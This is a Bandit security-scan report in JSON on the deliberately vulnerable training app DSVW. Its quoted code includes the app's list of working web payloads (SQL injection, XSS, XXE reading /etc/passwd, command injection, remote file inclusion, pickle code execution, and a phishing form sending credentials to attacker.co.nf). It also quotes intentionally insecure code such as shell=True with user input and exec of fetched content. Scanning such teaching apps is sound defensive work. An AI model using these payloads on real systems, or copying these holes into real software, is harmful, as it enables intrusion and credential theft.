{
  "errors": [],
  "generated_at": "2020-06-15T15:47:00Z",
  "metrics": {
    "_totals": {
      "CONFIDENCE.HIGH": 12,
      "CONFIDENCE.LOW": 0,
      "CONFIDENCE.MEDIUM": 3,
      "CONFIDENCE.UNDEFINED": 0,
      "SEVERITY.HIGH": 1,
      "SEVERITY.LOW": 2,
      "SEVERITY.MEDIUM": 12,
      "SEVERITY.UNDEFINED": 0,
      "loc": 86,
      "nosec": 0
    },
    "dsvw/dsvw.py": {
      "CONFIDENCE.HIGH": 12,
      "CONFIDENCE.LOW": 0,
      "CONFIDENCE.MEDIUM": 3,
      "CONFIDENCE.UNDEFINED": 0,
      "SEVERITY.HIGH": 1,
      "SEVERITY.LOW": 2,
      "SEVERITY.MEDIUM": 12,
      "SEVERITY.UNDEFINED": 0,
      "loc": 86,
      "nosec": 0
    }
  },
  "results": [
    {
      "code": "1 #!/usr/bin/env python\n2 import BaseHTTPServer, cgi, cStringIO, httplib, json, os, pickle, random, re, SocketServer, sqlite3, string, sys, subprocess, time, traceback, urllib, xml.etree.ElementTree\n3 try:\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "LOW",
      "issue_text": "Consider possible security implications associated with pickle module.",
      "line_number": 2,
      "line_range": [
        2
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle",
      "test_id": "B403",
      "test_name": "blacklist"
    },
    {
      "code": "3 try:\n4     import lxml.etree\n5 except ImportError:\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "LOW",
      "issue_text": "Using lxml.etree to parse untrusted XML data is known to be vulnerable to XML attacks. Replace lxml.etree with the equivalent defusedxml package.",
      "line_number": 4,
      "line_range": [
        4
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b410-import-lxml",
      "test_id": "B410",
      "test_name": "blacklist"
    },
    {
      "code": "8 NAME, VERSION, GITHUB, AUTHOR, LICENSE = \"Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)\", \"0.1m\", \"https://github.com/stamparm/DSVW\", \"Miroslav Stampar (@stamparm)\", \"Public domain (FREE)\"\n9 LISTEN_ADDRESS, LISTEN_PORT = \"0.0.0.0\", 8000\n10 HTML_PREFIX, HTML_POSTFIX = \"<!DOCTYPE html>\\n<html>\\n<head>\\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\\n<title>%s</title>\\n</head>\\n<body style='font: 12px monospace'>\\n<script>function process(data) {alert(\\\"Surname(s) from JSON results: \\\" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\\\"position: absolute; top: 5px; right: 5px;\\\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\\n\" % cgi.escape(NAME), \"<div style=\\\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\\\">Powered by <a href=\\\"%s\\\" style=\\\"font-weight: bold; text-decoration: none; visited: blue; color: blue\\\" target=\\\"_blank\\\">%s</a> (v<b>%s</b>)</div>\\n</body>\\n</html>\" % (GITHUB, re.search(r\"\\(([^)]+)\", NAME).group(1), VERSION)\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "Possible binding to all interfaces.",
      "line_number": 9,
      "line_range": [
        9
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b104_hardcoded_bind_all_interfaces.html",
      "test_id": "B104",
      "test_name": "hardcoded_bind_all_interfaces"
    },
    {
      "code": "11 USERS_XML = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\"?><users><user id=\"0\"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id=\"1\"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id=\"2\"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id=\"3\"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>\"\"\"\n12 CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29#Boolean_Exploitation_Technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29#Time_delay_Exploitation_technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29#Union_Exploitation_Technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.2\", \"/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if not subprocess.mswindows else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3Dh1rvVnvx%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if not subprocess.mswindows else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://www.owasp.org/index.php/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.2\", \"/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.2\", \"/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fattacker.co.nf%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=http%3A%2F%2Fattacker.co.nf\", \"https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if not subprocess.mswindows else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://www.owasp.org/index.php/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if not subprocess.mswindows else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=http%%3A%%2F%%2Fpastebin.com%%2Fraw.php%%3Fi%%3DN5ccE6iH&amp;cmd=%s\" % (\"ifconfig\" if not subprocess.mswindows else \"ipconfig\"), \"https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.quote(\"ping -c 5 127.0.0.1\" if not subprocess.mswindows else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://www.owasp.org/index.php/Denial_of_Service\"))\n13 \n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Using xml.etree.ElementTree.fromstring to parse untrusted XML data is known to be vulnerable to XML attacks. Replace xml.etree.ElementTree.fromstring with its defusedxml equivalent function or make sure defusedxml.defuse_stdlib() is called",
      "line_number": 12,
      "line_range": [
        12
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-xml-bad-elementtree",
      "test_id": "B314",
      "test_name": "blacklist"
    },
    {
      "code": "18     cursor.execute(\"CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)\")\n19     cursor.executemany(\"INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)\", ((_.findtext(\"username\"), _.findtext(\"name\"), _.findtext(\"surname\"), _.findtext(\"password\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))\n20     cursor.execute(\"CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)\")\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Using xml.etree.ElementTree.fromstring to parse untrusted XML data is known to be vulnerable to XML attacks. Replace xml.etree.ElementTree.fromstring with its defusedxml equivalent function or make sure defusedxml.defuse_stdlib() is called",
      "line_number": 19,
      "line_range": [
        19
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b313-b320-xml-bad-elementtree",
      "test_id": "B314",
      "test_name": "blacklist"
    },
    {
      "code": "28                 if \"id\" in params:\n29                     cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])\n30                     content += \"<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name</th><th>surname</th></thead>%s</table>%s\" % (\"\".join(\"<tr>%s</tr>\" % \"\".join(\"<td>%s</td>\" % (\"-\" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "Possible SQL injection vector through string-based query construction.",
      "line_number": 29,
      "line_range": [
        29
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html",
      "test_id": "B608",
      "test_name": "hardcoded_sql_expressions"
    },
    {
      "code": "33                 elif \"object\" in params:\n34                     content = str(pickle.loads(params[\"object\"]))\n35                 elif \"path\" in params:\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.",
      "line_number": 34,
      "line_range": [
        34
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-pickle",
      "test_id": "B301",
      "test_name": "blacklist"
    },
    {
      "code": "35                 elif \"path\" in params:\n36                     content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.urlopen(params[\"path\"])).read()\n37                 elif \"domain\" in params:\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.",
      "line_number": 36,
      "line_range": [
        36
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b310-urllib-urlopen",
      "test_id": "B310",
      "test_name": "blacklist"
    },
    {
      "code": "37                 elif \"domain\" in params:\n38                     content = subprocess.check_output(\"nslookup \" + params[\"domain\"], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n39                 elif \"xml\" in params:\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "HIGH",
      "issue_text": "subprocess call with shell=True identified, security issue.",
      "line_number": 38,
      "line_range": [
        38
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html",
      "test_id": "B602",
      "test_name": "subprocess_popen_with_shell_equals_true"
    },
    {
      "code": "39                 elif \"xml\" in params:\n40                     content = lxml.etree.tostring(lxml.etree.parse(cStringIO.StringIO(params[\"xml\"]), lxml.etree.XMLParser(no_network=False)), pretty_print=True)\n41                 elif \"name\" in params:\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Using lxml.etree.parse to parse untrusted XML data is known to be vulnerable to XML attacks. Replace lxml.etree.parse with its defusedxml equivalent function.",
      "line_number": 40,
      "line_range": [
        40
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-xml-bad-etree",
      "test_id": "B320",
      "test_name": "blacklist"
    },
    {
      "code": "41                 elif \"name\" in params:\n42                     found = lxml.etree.parse(cStringIO.StringIO(USERS_XML)).xpath(\".//user[name/text()='%s']\" % params[\"name\"])\n43                     content += \"<b>Surname:</b> %s%s\" % (found[-1].find(\"surname\").text if found else \"-\", HTML_POSTFIX)\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Using lxml.etree.parse to parse untrusted XML data is known to be vulnerable to XML attacks. Replace lxml.etree.parse with its defusedxml equivalent function.",
      "line_number": 42,
      "line_range": [
        42
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b313-b320-xml-bad-etree",
      "test_id": "B320",
      "test_name": "blacklist"
    },
    {
      "code": "54                 elif \"include\" in params:\n55                     backup, sys.stdout, program, envs = sys.stdout, cStringIO.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}\n56                     exec(program) in envs\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.",
      "line_number": 55,
      "line_range": [
        55
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b310-urllib-urlopen",
      "test_id": "B310",
      "test_name": "blacklist"
    },
    {
      "code": "55                     backup, sys.stdout, program, envs = sys.stdout, cStringIO.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}\n56                     exec(program) in envs\n57                     content += sys.stdout.getvalue()\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Use of exec detected.",
      "line_number": 56,
      "line_range": [
        56
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b102_exec_used.html",
      "test_id": "B102",
      "test_name": "exec_used"
    },
    {
      "code": "63             elif path == \"/users.json\":\n64                 content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")\n65             elif path == \"/login\":\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "Using xml.etree.ElementTree.fromstring to parse untrusted XML data is known to be vulnerable to XML attacks. Replace xml.etree.ElementTree.fromstring with its defusedxml equivalent function or make sure defusedxml.defuse_stdlib() is called",
      "line_number": 64,
      "line_range": [
        64
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b313-b320-xml-bad-elementtree",
      "test_id": "B314",
      "test_name": "blacklist"
    },
    {
      "code": "65             elif path == \"/login\":\n66                 cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")\n67                 content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\"\n",
      "filename": "dsvw/dsvw.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "Possible SQL injection vector through string-based query construction.",
      "line_number": 66,
      "line_range": [
        66
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html",
      "test_id": "B608",
      "test_name": "hardcoded_sql_expressions"
    }
  ]
}